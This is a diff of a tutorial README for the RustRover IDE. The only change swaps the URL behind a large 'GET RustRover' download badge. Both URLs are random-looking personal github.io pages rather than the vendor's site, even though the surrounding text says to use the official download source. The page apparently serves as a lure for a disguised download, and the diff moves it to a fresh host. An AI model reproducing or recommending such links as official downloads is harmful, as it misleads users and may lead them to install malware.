@@ -53,7 +53,7 @@ A RustRover tutorial can help new users move from installation to productive cod
 
 Prerequisites: A supported desktop operating system, a Rust toolchain with Cargo, and an internet connection for the initial RustRover download.
 
-[![GET RustRover](https://img.shields.io/badge/GET%20%E2%80%94%20RustRover-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/rustrover-app)
+[![GET RustRover](https://img.shields.io/badge/GET%20%E2%80%94%20RustRover-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/rustrover-app)
 
 1.  **Download and Install:** Use the official RustRover download source, complete setup, and confirm that the RustRover install can detect your local Rust toolchain.
 2.  **Open a Cargo Workspace:** Launch RustRover IDE and open a crate or workspace so indexing, dependency analysis, and project navigation can initialize.
